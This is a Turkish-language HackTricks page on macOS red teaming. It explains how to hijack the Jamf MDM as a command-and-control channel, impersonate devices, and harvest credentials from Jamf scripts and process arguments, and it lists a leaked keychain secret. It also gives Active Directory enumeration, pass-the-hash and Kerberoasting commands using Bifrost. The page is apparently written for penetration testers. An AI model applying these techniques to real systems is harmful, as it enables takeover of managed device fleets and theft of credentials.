# macOS Red Teaming

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter**'da **bizi takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**Web uygulamalarınız, ağınız ve bulutunuz hakkında bir hacker perspektifi edinin**

**Gerçek iş etkisi olan kritik, istismar edilebilir güvenlik açıklarını bulun ve raporlayın.** Saldırı yüzeyini haritalamak, ayrıcalıkları artırmanıza izin veren güvenlik sorunlarını bulmak ve temel kanıtları toplamak için otomatik istismarları kullanmak için 20'den fazla özel aracımızı kullanın, böylece sıkı çalışmanızı ikna edici raporlara dönüştürün.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## MDM'leri Kötüye Kullanma

* JAMF Pro: `jamf checkJSSConnection`
* Kandji

Yönetim platformuna erişmek için **admin kimlik bilgilerini ele geçirirseniz**, makinelerde kötü amaçlı yazılımınızı dağıtarak **tüm bilgisayarları tehlikeye atabilirsiniz**.

MacOS ortamlarında kırmızı takım çalışması için MDM'lerin nasıl çalıştığına dair bir anlayışa sahip olmak şiddetle tavsiye edilir:

{% content-ref url="macos-mdm/" %}
[macos-mdm](macos-mdm/)
{% endcontent-ref %}

### MDM'yi C2 Olarak Kullanma

Bir MDM, profilleri yüklemek, sorgulamak veya kaldırmak, uygulamaları yüklemek, yerel admin hesapları oluşturmak, firmware şifresi ayarlamak, FileVault anahtarını değiştirmek için izinlere sahip olacaktır...

Kendi MDM'nizi çalıştırmak için **CSR'nizi bir satıcı tarafından imzalatmanız** gerekir, bunu [**https://mdmcert.download/**](https://mdmcert.download/) ile elde etmeyi deneyebilirsiniz. Apple cihazları için kendi MDM'nizi çalıştırmak için [**MicroMDM**](https://github.com/micromdm/micromdm) kullanabilirsiniz.

Ancak, kayıtlı bir cihazda bir uygulama yüklemek için, hala bir geliştirici hesabı tarafından imzalanmış olması gerekir... ancak, MDM kaydı sırasında **cihaz, MDM'nin SSL sertifikasını güvenilir CA olarak ekler**, böylece artık her şeyi imzalayabilirsiniz.

Cihazı bir MDM'ye kaydetmek için, **`mobileconfig`** dosyasını root olarak yüklemeniz gerekir, bu bir **pkg** dosyası aracılığıyla teslim edilebilir (zip dosyasına sıkıştırabilir ve Safari'den indirildiğinde açılacaktır).

**Mythic agent Orthrus** bu tekniği kullanır.

### JAMF PRO'yu Kötüye Kullanma

JAMF, **özel betikler** (sistem yöneticisi tarafından geliştirilen betikler), **yerel yükler** (yerel hesap oluşturma, EFI şifresi ayarlama, dosya/proses izleme...) ve **MDM** (cihaz yapılandırmaları, cihaz sertifikaları...) çalıştırabilir.

#### JAMF kendi kendine kayıt

`https://<şirket-adı>.jamfcloud.com/enroll/` gibi bir sayfaya giderek **kendi kendine kayıt** özelliğinin etkin olup olmadığını kontrol edin. Eğer etkinse, **erişim için kimlik bilgileri isteyebilir**.

Bir şifre püskürtme saldırısı gerçekleştirmek için [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) betiğini kullanabilirsiniz.

Ayrıca, uygun kimlik bilgilerini bulduktan sonra, diğer kullanıcı adlarını aşağıdaki form ile brute-force yapabilirsiniz:

![](<../../.gitbook/assets/image (107).png>)

#### JAMF cihaz Kimlik Doğrulama

<figure><img src="../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

**`jamf`** ikili dosyası, keşif anında herkesle **paylaşılan** anahtar zincirini açma sırrını içeriyordu ve bu: **`jk23ucnq91jfu9aj`**.\
Ayrıca, jamf **/Library/LaunchAgents/com.jamf.management.agent.plist** içinde **LaunchDaemon** olarak **kalır**.

#### JAMF Cihaz Ele Geçirme

**JSS** (Jamf Software Server) **URL'si** **`jamf`** tarafından kullanılacak olan **`/Library/Preferences/com.jamfsoftware.jamf.plist`** dosyasında bulunmaktadır.\
Bu dosya temelde URL'yi içerir:

{% code overflow="wrap" %}
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://halbornasd.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
{% endcode %}

Yani, bir saldırgan, yüklendiğinde bu dosyayı **üzerine yazan** kötü niyetli bir paket (`pkg`) bırakabilir ve **URL'yi bir Typhon ajanından bir Mythic C2 dinleyicisine** ayarlayarak JAMF'i C2 olarak kötüye kullanabilir.

{% code overflow="wrap" %}
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
{% endcode %}

#### JAMF Taklit Etme

Bir cihaz ile JMF arasındaki **ileşimi taklit etmek** için şunlara ihtiyacınız var:

* Cihazın **UUID'si**: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
* Cihaz sertifikasını içeren **JAMF anahtarı**: `/Library/Application\ Support/Jamf/JAMF.keychain`

Bu bilgilerle, **çalıntı** Donanım **UUID'si** ile **SIP devre dışı** bırakılmış bir **VM** oluşturun, **JAMF anahtarını** bırakın, Jamf **ajanını** **hook** edin ve bilgilerini çalın.

#### Gizli Bilgilerin Çalınması

<figure><img src="../../.gitbook/assets/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Ayrıca, yöneticilerin Jamf aracılığıyla çalıştırmak isteyebileceği **özel betikleri** izlemek için `/Library/Application Support/Jamf/tmp/` konumunu da izleyebilirsiniz; çünkü bu betikler **buraya yerleştirilir, çalıştırılır ve kaldırılır**. Bu betikler **kimlik bilgilerini** içerebilir.

Ancak, **kimlik bilgileri** bu betiklere **parametreler** olarak geçebilir, bu nedenle `ps aux | grep -i jamf` komutunu izlemelisiniz (root olmadan bile).

[**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) adlı betik, yeni dosyaların eklenmesini ve yeni işlem argümanlarını dinleyebilir.

### macOS Uzaktan Erişim

Ayrıca **MacOS** "özel" **ağ** **protokolleri** hakkında:

{% content-ref url="../macos-security-and-privilege-escalation/macos-protocols.md" %}
[macos-protocols.md](../macos-security-and-privilege-escalation/macos-protocols.md)
{% endcontent-ref %}

## Active Directory

Bazı durumlarda **MacOS bilgisayarının bir AD'ye bağlı olduğunu** göreceksiniz. Bu senaryoda, aktif dizini **sıralamaya** çalışmalısınız. Aşağıdaki sayfalarda bazı **yardımlar** bulabilirsiniz:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/active-directory-methodology/" %}
[active-directory-methodology](../../windows-hardening/active-directory-methodology/)
{% endcontent-ref %}

{% content-ref url="../../network-services-pentesting/pentesting-kerberos-88/" %}
[pentesting-kerberos-88](../../network-services-pentesting/pentesting-kerberos-88/)
{% endcontent-ref %}

Size yardımcı olabilecek bazı **yerel MacOS araçları** `dscl` olabilir:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
Ayrıca, MacOS için AD'yi otomatik olarak listelemek ve kerberos ile oynamak üzere hazırlanmış bazı araçlar bulunmaktadır:

* [**Machound**](https://github.com/XMCyber/MacHound): MacHound, MacOS ana bilgisayarlarında Active Directory ilişkilerini toplama ve alma imkanı sağlayan Bloodhound denetim aracının bir uzantısıdır.
* [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost, macOS'taki Heimdal krb5 API'leri ile etkileşimde bulunmak üzere tasarlanmış bir Objective-C projesidir. Projenin amacı, hedefte başka bir çerçeve veya paket gerektirmeden yerel API'ler kullanarak macOS cihazlarında Kerberos etrafında daha iyi güvenlik testleri yapmaktır.
* [**Orchard**](https://github.com/its-a-feature/Orchard): Active Directory listeleme yapmak için JavaScript for Automation (JXA) aracı. 

### Alan Bilgisi
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Kullanıcılar

MacOS kullanıcılarının üç türü vardır:

* **Yerel Kullanıcılar** — Yerel OpenDirectory hizmeti tarafından yönetilir, Active Directory ile herhangi bir bağlantıları yoktur.
* **Ağ Kullanıcıları** — Kimlik doğrulamak için DC sunucusuna bağlantı gerektiren geçici Active Directory kullanıcılarıdır.
* **Mobil Kullanıcılar** — Kimlik bilgileri ve dosyaları için yerel bir yedekleme olan Active Directory kullanıcılarıdır.

Kullanıcılar ve gruplar hakkında yerel bilgiler _/var/db/dslocal/nodes/Default_ klasöründe saklanır.\
Örneğin, _mark_ adlı kullanıcının bilgileri _/var/db/dslocal/nodes/Default/users/mark.plist_ dosyasında ve _admin_ grubunun bilgileri _/var/db/dslocal/nodes/Default/groups/admin.plist_ dosyasında saklanır.

HasSession ve AdminTo kenarlarını kullanmanın yanı sıra, **MacHound, Bloodhound veritabanına üç yeni kenar ekler**:

* **CanSSH** - ana makineye SSH ile bağlanmasına izin verilen varlık
* **CanVNC** - ana makineye VNC ile bağlanmasına izin verilen varlık
* **CanAE** - ana makinede AppleEvent betikleri çalıştırmasına izin verilen varlık
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
Daha fazla bilgi için [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Computer$ şifresi

Şifreleri almak için:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
**`Computer$`** parolasına Sistem anahtar zincirinde erişmek mümkündür.

### Over-Pass-The-Hash

Belirli bir kullanıcı ve hizmet için bir TGT alın:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
Bir kez TGT toplandığında, mevcut oturuma şu şekilde enjekte etmek mümkündür:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
Elde edilen hizmet biletleri ile diğer bilgisayarlardaki paylaşımlara erişim sağlamaya çalışmak mümkündür:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Anahtarlığa Erişim

Anahtarlık, bir istem oluşturulmadan erişildiğinde, bir kırmızı takım egzersizini ilerletmeye yardımcı olabilecek hassas bilgileri yüksek olasılıkla içerir:

{% content-ref url="macos-keychain.md" %}
[macos-keychain.md](macos-keychain.md)
{% endcontent-ref %}

## Harici Hizmetler

MacOS Kırmızı Takımı, genellikle **MacOS'un birkaç harici platformla doğrudan entegre olması** nedeniyle, normal bir Windows Kırmızı Takımından farklıdır. MacOS'un yaygın bir yapılandırması, **OneLogin senkronize edilmiş kimlik bilgileri kullanarak bilgisayara erişmek ve OneLogin aracılığıyla birkaç harici hizmete** (github, aws...) erişmektir.

## Çeşitli Kırmızı Takım teknikleri

### Safari

Safari'de bir dosya indirildiğinde, eğer "güvenli" bir dosya ise, **otomatik olarak açılacaktır**. Örneğin, eğer **bir zip indirirseniz**, otomatik olarak açılacaktır:

<figure><img src="../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

## Referanslar

* [**https://www.youtube.com/watch?v=IiMladUbL6E**](https://www.youtube.com/watch?v=IiMladUbL6E)
* [**https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6**](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
* [**https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0**](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
* [**Come to the Dark Side, We Have Apples: Turning macOS Management Evil**](https://www.youtube.com/watch?v=pOQOh07eMxY)
* [**OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall**](https://www.youtube.com/watch?v=ju1IYWUv4ZA)

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**Web uygulamalarınız, ağınız ve bulutunuz hakkında bir hacker perspektifi edinin**

**Gerçek iş etkisi olan kritik, istismar edilebilir güvenlik açıklarını bulun ve raporlayın.** Saldırı yüzeyini haritalamak, ayrıcalıkları artırmanıza izin veren güvenlik sorunlarını bulmak ve temel kanıtları toplamak için otomatik istismarları kullanmak için 20'den fazla özel aracımızı kullanın, sıkı çalışmanızı ikna edici raporlara dönüştürün.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
